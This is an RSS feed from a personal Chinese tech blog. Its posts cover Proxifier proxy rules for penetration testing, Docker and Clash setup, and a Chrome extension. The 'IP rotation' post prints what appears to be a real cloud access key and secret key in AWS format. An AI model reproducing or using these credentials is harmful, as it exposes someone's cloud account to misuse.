<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>无星的小窝</title>
    <link>http://blog.xingxiaowu.cn/</link>
    
    <atom:link href="http://blog.xingxiaowu.cn/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>一个么的前途的弟中弟</description>
    <pubDate>Tue, 22 Oct 2024 08:43:10 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>无星的渗透之旅速成篇（七）-Proxifier使用</title>
      <link>http://blog.xingxiaowu.cn/2024/10/22/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%83%EF%BC%89-Proxifier%E4%BD%BF%E7%94%A8/</link>
      <guid>http://blog.xingxiaowu.cn/2024/10/22/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%83%EF%BC%89-Proxifier%E4%BD%BF%E7%94%A8/</guid>
      <pubDate>Tue, 22 Oct 2024 12:09:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;有同事不会配,帮忙配了一下,顺带记录成文字&lt;/p&gt;
&lt;h1 id=&quot;页面介绍&quot;&gt;&lt;a href=&quot;#页面介绍&quot; class=&quot;headerlink&quot; title=&quot;页面介绍&quot;&gt;&lt;/a&gt;页面介绍&lt;/h1&gt;&lt;p&gt;装完长这个样子&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022161949.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;1-配置可用的代理服务&quot;&gt;&lt;a href=&quot;#1-配置可用的代理服务&quot; class=&quot;headerlink&quot; title=&quot;1.配置可用的代理服务&quot;&gt;&lt;/a&gt;1.配置可用的代理服务&lt;/h1&gt;&lt;p&gt;我们有时候会起不同的代理服务以应对不同的需求&lt;/p&gt;
&lt;p&gt;比如有时候翻墙我们会使用小猫咪或者小飞机&lt;/p&gt;
&lt;p&gt;而进行安全测试的时候则使用Burp&lt;/p&gt;
&lt;p&gt;开发有时候轻量一点会使用Fiddler或者Charles&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有同事不会配,帮忙配了一下,顺带记录成文字</p><h1 id="页面介绍"><a href="#页面介绍" class="headerlink" title="页面介绍"></a>页面介绍</h1><p>装完长这个样子</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022161949.png"></p><h1 id="1-配置可用的代理服务"><a href="#1-配置可用的代理服务" class="headerlink" title="1.配置可用的代理服务"></a>1.配置可用的代理服务</h1><p>我们有时候会起不同的代理服务以应对不同的需求</p><p>比如有时候翻墙我们会使用小猫咪或者小飞机</p><p>而进行安全测试的时候则使用Burp</p><p>开发有时候轻量一点会使用Fiddler或者Charles</p><p>所以我们需要配置我们的代理服务</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022162209.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022162253.png"></p><p>当然看起来非常简单,就是填个ip和端口,选个协议就行了</p><p>一般我们选择<code>https</code></p><h1 id="2-配置代理规则"><a href="#2-配置代理规则" class="headerlink" title="2.配置代理规则"></a>2.配置代理规则</h1><p>那么有了代理服务之后,我们还需要配置代理规则</p><p>说人话就是:哪些流量走哪些代理,或者不走代理直连</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022162508.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022162556.png"></p><p>我们一项项解释</p><p>其实写的很明白了,规则是从顶部到底部处理,也就是说如果你配置了重复的规则,那么会以最后一条为准(不过一般也没人这么做吧)</p><p>看这五列:规则名称&#x2F;应用程序&#x2F;目标主机&#x2F;目标端口&#x2F;动作</p><h2 id="规则名称"><a href="#规则名称" class="headerlink" title="规则名称"></a>规则名称</h2><p>自己想叫什么就叫什么</p><h2 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h2><p>哪些应用程序需要走代理<br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022163054.png"></p><p>这个看自己的需求了</p><p>比如我需要微信走代理</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wechatappex.exe</span><br></pre></td></tr></table></figure><p>steam走代理</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steam.exe</span><br></pre></td></tr></table></figure><p>饥荒走代理</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dontstarve_steam.exe;dontstarve_dedicated_server_nullrenderer.exe;</span><br></pre></td></tr></table></figure><p>有兄弟会好奇,这些应用名称都哪来的?</p><p>这个其实有各种方法可以获得,比如你直接看任务管理器</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022163458.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F7/20241022163530.png"></p><p>有些兄弟会问,这么多,写哪个呢?大不了就全写上呗,也不费什么事,右键选择<code>在文件位置中打开</code>直接复制粘贴名称就完事了.</p><p>也可以百度直接抄前人的经验</p><h2 id="目标主机和目标端口"><a href="#目标主机和目标端口" class="headerlink" title="目标主机和目标端口"></a>目标主机和目标端口</h2><p>就和他的名字一样,你通过这个规则需要访问的目标的主机域名,ip和端口</p><p>一般我都是任意,因为我在翻墙这种需求中,有小猫咪帮我配好pac规则,我不使用<code>Proxifier</code>,当然,它一样能做到这个事.</p><h2 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h2><p>最后就是Acton了,选择你的代理服务器,或者直连,或者拦截</p><p>此外请注意,这些条件之间的规则是<code>且规则</code>,应该不用再解释</p><p>如果你需要<code>指定域名</code>走指定代理,那么只要填域名就行了</p><h1 id="Over"><a href="#Over" class="headerlink" title="Over"></a>Over</h1>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/10/22/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%83%EF%BC%89-Proxifier%E4%BD%BF%E7%94%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的渗透之旅速成篇（六）-ip轮转</title>
      <link>http://blog.xingxiaowu.cn/2024/10/22/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%85%AD%EF%BC%89-ip%E8%BD%AE%E8%BD%AC/</link>
      <guid>http://blog.xingxiaowu.cn/2024/10/22/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%85%AD%EF%BC%89-ip%E8%BD%AE%E8%BD%AC/</guid>
      <pubDate>Tue, 22 Oct 2024 12:09:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;a href=&quot;https://developer.volcengine.com/articles/7381520178355372042&quot;&gt;https://developer.volcengine.com/articles/7381520178355372042&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  &lt;code&gt;Access Key:AKIAISGP63MXTUVKLTHA&lt;/code&gt;&lt;br&gt;  &lt;code&gt;Secret Key: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&lt;/code&gt;&lt;/p&gt;
</description>
      
      
      
      <content:encoded><![CDATA[<p><a href="https://developer.volcengine.com/articles/7381520178355372042">https://developer.volcengine.com/articles/7381520178355372042</a></p><p>  <code>Access Key:AKIAISGP63MXTUVKLTHA</code><br>  <code>Secret Key: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</code></p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/10/22/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%85%AD%EF%BC%89-ip%E8%BD%AE%E8%BD%AC/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的docker学习（一）- 环境准备</title>
      <link>http://blog.xingxiaowu.cn/2024/10/13/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E6%97%A0%E6%98%9F%E7%9A%84docker%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89-%20%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</link>
      <guid>http://blog.xingxiaowu.cn/2024/10/13/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E6%97%A0%E6%98%9F%E7%9A%84docker%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89-%20%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</guid>
      <pubDate>Sun, 13 Oct 2024 01:38:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;Centos&quot;&gt;&lt;a href=&quot;#Centos&quot; class=&quot;headerlink&quot; title=&quot;Centos&quot;&gt;&lt;/a&gt;Centos&lt;/h1&gt;&lt;h2 id=&quot;安装docker&quot;&gt;&lt;a href=&quot;#安装docker&quot; class=&quot;headerlink&quot; title=&quot;安装docker&quot;&gt;&lt;/a&gt;安装docker&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo yum check-update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo yum install -y yum-utils&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sudo yum install docker -y&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo yum install -y docker-ce&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl start docker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl &lt;span class=&quot;built_in&quot;&gt;enable&lt;/span&gt; docker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;设置镜像&quot;&gt;&lt;a href=&quot;#设置镜像&quot; class=&quot;headerlink&quot; title=&quot;设置镜像&quot;&gt;&lt;/a&gt;设置镜像&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 不存在就创建&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;vim /etc/docker/daemon.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 设置内容&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;string&quot;&gt;&amp;quot;registry-mirrors&amp;quot;&lt;/span&gt;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;https://docker.1panel.dev&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;https://docker.fxxk.dedyn.io&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;https://docker.xn--6oq72ry9d5zx.cn&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;https://docker.m.daocloud.io&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;https://a.ussh.net&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;https://docker.zhai.cm&amp;quot;&lt;/span&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#重载systemd管理守护进程配置文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl daemon-reload &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#重启 Docker 服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl restart docker &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;一些镜像地址&quot;&gt;&lt;a href=&quot;#一些镜像地址&quot; class=&quot;headerlink&quot; title=&quot;一些镜像地址:&quot;&gt;&lt;/a&gt;一些镜像地址:&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://dockerproxy.cn/&quot;&gt;https://dockerproxy.cn/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;查看日志&quot;&gt;&lt;a href=&quot;#查看日志&quot; class=&quot;headerlink&quot; title=&quot;查看日志&quot;&gt;&lt;/a&gt;查看日志&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# dstserver 是容器名字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker logs -f dstserver&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;我常用的一些docker&quot;&gt;&lt;a href=&quot;#我常用的一些docker&quot; class=&quot;headerlink&quot; title=&quot;我常用的一些docker&quot;&gt;&lt;/a&gt;我常用的一些docker&lt;/h1&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h1><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo yum check-update</span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line">yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment">#sudo yum install docker -y</span></span><br><span class="line">sudo yum install -y docker-ce</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br><span class="line">docker --version</span><br></pre></td></tr></table></figure><h2 id="设置镜像"><a href="#设置镜像" class="headerlink" title="设置镜像"></a>设置镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不存在就创建</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># 设置内容</span></span><br><span class="line">&#123;<span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line"><span class="string">&quot;https://docker.1panel.dev&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://docker.fxxk.dedyn.io&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://docker.xn--6oq72ry9d5zx.cn&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://a.ussh.net&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://docker.zhai.cm&quot;</span>]&#125;</span><br><span class="line"><span class="comment">#重载systemd管理守护进程配置文件</span></span><br><span class="line">sudo systemctl daemon-reload </span><br><span class="line"><span class="comment">#重启 Docker 服务</span></span><br><span class="line">sudo systemctl restart docker </span><br></pre></td></tr></table></figure><h3 id="一些镜像地址"><a href="#一些镜像地址" class="headerlink" title="一些镜像地址:"></a>一些镜像地址:</h3><p><a href="https://dockerproxy.cn/">https://dockerproxy.cn/</a></p><h1 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dstserver 是容器名字</span></span><br><span class="line">docker logs -f dstserver</span><br></pre></td></tr></table></figure><h1 id="我常用的一些docker"><a href="#我常用的一些docker" class="headerlink" title="我常用的一些docker"></a>我常用的一些docker</h1><h2 id="ddddocr"><a href="#ddddocr" class="headerlink" title="ddddocr"></a>ddddocr</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull 329106954/ocr_server:centos</span><br><span class="line">docker run -d -p 9898:9898 --name ddddocr imageid</span><br></pre></td></tr></table></figure><h2 id="clash"><a href="#clash" class="headerlink" title="clash"></a>clash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=clash -v <span class="string">&quot;<span class="variable">$PWD</span>/clash:/root/.config/clash/&quot;</span> -p <span class="string">&quot;7890:7890&quot;</span> -p <span class="string">&quot;7891:7891&quot;</span> -p <span class="string">&quot;9090:9090&quot;</span> --restart=unless-stopped dreamacro/clash</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/docker/">docker</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/docker/">docker</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/10/13/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E6%97%A0%E6%98%9F%E7%9A%84docker%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89-%20%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Linux开启Clash</title>
      <link>http://blog.xingxiaowu.cn/2024/10/07/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Linux%E5%BC%80%E5%90%AFClash/</link>
      <guid>http://blog.xingxiaowu.cn/2024/10/07/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Linux%E5%BC%80%E5%90%AFClash/</guid>
      <pubDate>Mon, 07 Oct 2024 07:48:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;方式一-docker安装&quot;&gt;&lt;a href=&quot;#方式一-docker安装&quot; class=&quot;headerlink&quot; title=&quot;方式一 docker安装&quot;&gt;&lt;/a&gt;方式一 docker安装&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 设置docker加速&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;vim /etc/docker/daemon.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 填写内容&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&amp;quot;registry-mirrors&amp;quot;: [&amp;quot;https://dockerproxy.cn&amp;quot;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 重启docker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl daemon-reload&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo systemctl restart docker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 安装clash镜像&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run -d --name=clash -v &amp;quot;$PWD/clash:/root/.config/clash/&amp;quot; -p &amp;quot;7890:7890&amp;quot; -p &amp;quot;7891:7891&amp;quot; -p &amp;quot;9090:9090&amp;quot; --restart=unless-stopped dreamacro/clash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;镜像安装完成,就会在当前目录下生成clash文件夹，打开文件夹，将文件夹下的config.yaml 替换成上面我们从机场购买的配置,就好了&lt;/p&gt;
</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="方式一-docker安装"><a href="#方式一-docker安装" class="headerlink" title="方式一 docker安装"></a>方式一 docker安装</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 设置docker加速</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"># 填写内容</span><br><span class="line">&#123;&quot;registry-mirrors&quot;: [&quot;https://dockerproxy.cn&quot;]&#125;</span><br><span class="line"># 重启docker</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"></span><br><span class="line"># 安装clash镜像</span><br><span class="line">docker run -d --name=clash -v &quot;$PWD/clash:/root/.config/clash/&quot; -p &quot;7890:7890&quot; -p &quot;7891:7891&quot; -p &quot;9090:9090&quot; --restart=unless-stopped dreamacro/clash</span><br></pre></td></tr></table></figure><p>镜像安装完成,就会在当前目录下生成clash文件夹，打开文件夹，将文件夹下的config.yaml 替换成上面我们从机场购买的配置,就好了</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/clash/">clash</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/clash/">clash</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/10/07/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Linux%E5%BC%80%E5%90%AFClash/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的前端之旅（三十一）——Chrome插件监听网络请求</title>
      <link>http://blog.xingxiaowu.cn/2024/09/30/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94Chrome%E6%8F%92%E4%BB%B6%E7%9B%91%E5%90%AC%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/</link>
      <guid>http://blog.xingxiaowu.cn/2024/09/30/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94Chrome%E6%8F%92%E4%BB%B6%E7%9B%91%E5%90%AC%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/</guid>
      <pubDate>Mon, 30 Sep 2024 10:23:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;需要监听某个网络请求&lt;/p&gt;
&lt;p&gt;并根据body信息做出判断&lt;/p&gt;
&lt;p&gt;将结果展示到插件页面&lt;/p&gt;
